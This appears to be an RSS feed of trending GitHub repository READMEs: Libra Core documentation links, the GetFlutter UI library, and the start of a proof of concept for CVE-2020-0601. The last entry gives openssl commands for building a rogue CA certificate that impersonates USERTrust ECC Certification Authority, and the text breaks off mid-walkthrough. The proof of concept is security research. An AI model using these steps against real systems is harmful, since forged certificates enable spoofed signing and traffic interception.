&lt;li&gt;&lt;a href="https://developers.libra.org/docs/libra-protocol" rel="nofollow"&gt;Libra Protocol: Key Concepts&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://developers.libra.org/docs/life-of-a-transaction" rel="nofollow"&gt;Life of a Transaction&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-try-libra-core" class="anchor" aria-hidden="true" href="#try-libra-core"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Try Libra Core&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://developers.libra.org/docs/my-first-transaction" rel="nofollow"&gt;My First Transaction&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://developers.libra.org/docs/move-overview" rel="nofollow"&gt;Getting Started With Move&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-technical-papers" class="anchor" aria-hidden="true" href="#technical-papers"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Technical Papers&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://developers.libra.org/docs/the-libra-blockchain-paper" rel="nofollow"&gt;The Libra Blockchain&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://developers.libra.org/docs/move-paper" rel="nofollow"&gt;Move: A Language With Programmable Resources&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://developers.libra.org/docs/state-machine-replication-paper" rel="nofollow"&gt;State Machine Replication in the Libra Blockchain&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-blog" class="anchor" aria-hidden="true" href="#blog"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Blog&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://developers.libra.org/blog/2019/06/18/the-path-forward/" rel="nofollow"&gt;Libra: The Path Forward&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-libra-codebase" class="anchor" aria-hidden="true" href="#libra-codebase"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Libra Codebase&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://developers.libra.org/docs/libra-core-overview" rel="nofollow"&gt;Libra Core Overview&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://developers.libra.org/docs/crates/admission-control" rel="nofollow"&gt;Admission Control&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://developers.libra.org/docs/crates/bytecode-verifier" rel="nofollow"&gt;Bytecode Verifier&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://developers.libra.org/docs/crates/consensus" rel="nofollow"&gt;Consensus&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://developers.libra.org/docs/crates/crypto" rel="nofollow"&gt;Crypto&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://developers.libra.org/docs/crates/execution" rel="nofollow"&gt;Execution&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://developers.libra.org/docs/crates/mempool" rel="nofollow"&gt;Mempool&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://developers.libra.org/docs/crates/ir-to-bytecode" rel="nofollow"&gt;Move IR Compiler&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://developers.libra.org/docs/crates/move-language" rel="nofollow"&gt;Move Language&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://developers.libra.org/docs/crates/network" rel="nofollow"&gt;Network&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://developers.libra.org/docs/crates/storage" rel="nofollow"&gt;Storage&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://developers.libra.org/docs/crates/vm" rel="nofollow"&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-community" class="anchor" aria-hidden="true" href="#community"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Community&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Join us on the &lt;a href="https://community.libra.org" rel="nofollow"&gt;Libra Discourse&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Ask a question on &lt;a href="https://stackoverflow.com/questions/tagged/libra" rel="nofollow"&gt;Stack Overflow&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Get the latest updates to our project by signing up for our &lt;a href="https://developers.libra.org/newsletter_form" rel="nofollow"&gt;newsletter&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-license" class="anchor" aria-hidden="true" href="#license"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;License&lt;/h2&gt;
&lt;p&gt;Libra Core is licensed as &lt;a href="https://github.com/libra/libra/blob/master/LICENSE"&gt;Apache 2.0&lt;/a&gt;.&lt;/p&gt;
&lt;/article&gt;&lt;/div&gt;</description><author>libra</author><guid isPermaLink="false">https://github.com/libra/libra</guid><pubDate>Sun, 19 Jan 2020 00:17:00 GMT</pubDate></item><item><title>ionicfirebaseapp/getflutter #18 in All Languages, Today</title><link>https://github.com/ionicfirebaseapp/getflutter</link><description>&lt;p&gt;&lt;i&gt;Most popular and easy to use open source UI library with 1000+ Widgets to build flutter app. &lt;/i&gt;&lt;/p&gt;&lt;div id="readme" class="md" data-path="README.md"&gt;&lt;article class="markdown-body entry-content p-5" itemprop="text"&gt;&lt;p align="center"&gt;
  &lt;a href="https://www.getflutter.dev/" rel="nofollow"&gt;
    &lt;img src="https://camo.githubusercontent.com/853f881fafaa590c6990b7aa41309902b36cbaac/68747470733a2f2f696b2e696d6167656b69742e696f2f696f6e696366697265626173656170702f74723a772d6175746f2d3330302f67662d6c6f676f2d672d625f5359534265715572522e706e67" alt="Get Flutter" data-canonical-src="https://ik.imagekit.io/ionicfirebaseapp/tr:w-auto-300/gf-logo-g-b_SYSBeqUrR.png" style="max-width:100%;"&gt;
  &lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.getflutter.dev" rel="nofollow"&gt;&lt;strong&gt;GetFlutter&lt;/strong&gt;&lt;/a&gt; is a 100% Free Flutter open source UI library that is build to make flutter development easier than ever. GetFlutter has 1000+ pre-build widgets that you could reuse to build both Flutter Web or Mobile app development.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-table-of-contents" class="anchor" aria-hidden="true" href="#table-of-contents"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Table of contents&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#screenshot"&gt;Screenshot&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#quick-start"&gt;Quick start&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#features"&gt;Features&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#demo"&gt;Demo&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#contributing"&gt;Contributing&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#bugs-and-feature-requests"&gt;Bugs and feature requests&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#documentation"&gt;Documentation&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#copyright-and-license"&gt;Copyright and license&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-screenshot" class="anchor" aria-hidden="true" href="#screenshot"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Screenshot&lt;/h2&gt;
 &lt;p align="center"&gt;
  &lt;a href="https://www.getflutter.dev/" rel="nofollow"&gt;
    &lt;img src="https://camo.githubusercontent.com/9edd602254af14fc8c33e8319ad7610524700ea2/68747470733a2f2f696b2e696d6167656b69742e696f2f696f6e696366697265626173656170702f6769746875625f616c6c5f73637265656e735f73634d7975397658672e706e67" alt="Get Flutter" data-canonical-src="https://ik.imagekit.io/ionicfirebaseapp/github_all_screens_scMyu9vXg.png" style="max-width:100%;"&gt;
  &lt;/a&gt;
&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-quick-start" class="anchor" aria-hidden="true" href="#quick-start"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Quick start&lt;/h2&gt;
&lt;p&gt;Read the &lt;a href="https://docs.getflutter.dev" rel="nofollow"&gt;Getting started page&lt;/a&gt;
Forum &lt;a href="https://forum.getflutter.dev" rel="nofollow"&gt;Support and discussion &lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-features" class="anchor" aria-hidden="true" href="#features"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Features&lt;/h2&gt;
&lt;p&gt;In this beta release we are going to launch the library with following components :&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-button----badge---avatar---image---card---carousel---tile---tab---typography" class="anchor" aria-hidden="true" href="#button----badge---avatar---image---card---carousel---tile---tab---typography"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Button  |  Badge |  Avatar |  Image |  Card |  Carousel |  Tile |  Tab |  Typography&lt;/h4&gt;
&lt;h2&gt;&lt;a id="user-content-demo" class="anchor" aria-hidden="true" href="#demo"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Demo&lt;/h2&gt;
&lt;p&gt;Coming Soon&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-contributing" class="anchor" aria-hidden="true" href="#contributing"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Contributing&lt;/h2&gt;
&lt;p&gt;GetFlutter is &lt;strong&gt;100% free&lt;/strong&gt; and &lt;strong&gt;open source&lt;/strong&gt;. We encourage and support an active, healthy community that accepts contributions from the public – including you!&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;If you are a developer, feel free to check out the source and submit pull requests.&lt;/li&gt;
&lt;li&gt;Dig into &lt;a href="CONTRIBUTING.md"&gt;&lt;strong&gt;CONTRIBUTING.MD&lt;/strong&gt;&lt;/a&gt;, which covers submitting bugs, requesting new features, preparing your code for a pull request, etc.&lt;/li&gt;
&lt;li&gt;Please don't forget to &lt;strong&gt;like&lt;/strong&gt;, &lt;strong&gt;follow&lt;/strong&gt;, and &lt;strong&gt;star our repo&lt;/strong&gt;! Join our growing &lt;a href="http://forum.getflutter.dev" rel="nofollow"&gt;community&lt;/a&gt; to keep up to date with the latest Get Flutter development.&lt;/li&gt;
&lt;li&gt;Not sure what to work on? &lt;a href="https://roadmap.getflutter.dev" rel="nofollow"&gt;&lt;strong&gt;We've got lots ideas.&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-bugs-and-feature-requests" class="anchor" aria-hidden="true" href="#bugs-and-feature-requests"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Bugs-and-feature-requests&lt;/h2&gt;
&lt;h2&gt;&lt;a id="user-content-documentation" class="anchor" aria-hidden="true" href="#documentation"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Documentation&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://docs.getflutter.dev" rel="nofollow"&gt;&lt;strong&gt;Installation Guide&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[&lt;strong&gt;NOTE&lt;/strong&gt;] Our library will also work on flutter web but since flutter didn't released stable version for Flutter web and it is still in Beta release so you might get some rendering problem and hence we will update our library as flutter comes with the stable release for Flutter Web.&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-social-media" class="anchor" aria-hidden="true" href="#social-media"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Social Media&lt;/h3&gt;
&lt;p&gt;Twitter: &lt;a href="https://twitter.com/getflutterdev" rel="nofollow"&gt;https://twitter.com/getflutterdev&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Facebook: &lt;a href="https://www.facebook.com/getflutter" rel="nofollow"&gt;https://www.facebook.com/getflutter&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Linkedin: &lt;a href="https://www.linkedin.com/company/getflutter" rel="nofollow"&gt;https://www.linkedin.com/company/getflutter&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Instagram: &lt;a href="https://www.instagram.com/getflutter.dev/" rel="nofollow"&gt;https://www.instagram.com/getflutter.dev/&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-copyright-and-license" class="anchor" aria-hidden="true" href="#copyright-and-license"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Copyright-and-license&lt;/h2&gt;
&lt;p&gt;Code and documentation copyright 2017-2020 the &lt;a href="https://www.getflutter.dev" rel="nofollow"&gt;GETFLUTTER Authors&lt;/a&gt; and &lt;a href="https://pietechsolution.com" rel="nofollow"&gt;PIETECH SOLUTION PVT LTD.&lt;/a&gt; Code released under the [MIT License]. Docs released under &lt;a href="https://creativecommons.org/licenses/by/3.0/" rel="nofollow"&gt;Creative Commons&lt;/a&gt;.&lt;/p&gt;
&lt;/article&gt;&lt;/div&gt;</description><author>ionicfirebaseapp</author><guid isPermaLink="false">https://github.com/ionicfirebaseapp/getflutter</guid><pubDate>Sun, 19 Jan 2020 00:18:00 GMT</pubDate></item><item><title>kudelskisecurity/chainoffools #19 in All Languages, Today</title><link>https://github.com/kudelskisecurity/chainoffools</link><description>&lt;p&gt;&lt;i&gt;A PoC for CVE-2020-0601&lt;/i&gt;&lt;/p&gt;&lt;div id="readme" class="md" data-path="README.md"&gt;&lt;article class="markdown-body entry-content p-5" itemprop="text"&gt;&lt;h1&gt;&lt;a id="user-content-cryptoapi" class="anchor" aria-hidden="true" href="#cryptoapi"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;CryptoAPI&lt;/h1&gt;
&lt;p&gt;CVE-2020-0601: Windows CryptoAPI Spoofing Vulnerability exploitation. More information in our &lt;a href="https://research.kudelskisecurity.com/2020/01/15/cve-2020-0601-the-chainoffools-attack-explained-with-poc" rel="nofollow"&gt;blog post&lt;/a&gt;.&lt;/p&gt;
&lt;h1&gt;&lt;a id="user-content-ca-certificate" class="anchor" aria-hidden="true" href="#ca-certificate"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;CA certificate&lt;/h1&gt;
&lt;p&gt;We used the &lt;a href="http://www.tbs-x509.com/USERTrustECCCertificationAuthority.crt" rel="nofollow"&gt;USERTrust ECC Certification Authority&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Key template:&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;$ openssl ecparam -name secp384r1 -genkey -noout -out p384-key.pem -param_enc explicit&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;To generate a private key which match the public key certificate we used the script &lt;strong&gt;gen-key.py&lt;/strong&gt; (works with Python 3.6 and above). Then to generate the rogue CA:&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;$ openssl req -key p384-key-rogue.pem -new -out ca-rogue.pem -x509 -set_serial 0x5c8b99c55a94c5d27156decd8980cc26&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;With "C = US, ST = New Jersey, L = Jersey City, O = The USERTRUST Network, CN = USERTrust ECC Certification Authority" parameters&lt;/p&gt;
&lt;p&gt;Then we generate the following private key and certificate:&lt;/p&gt;
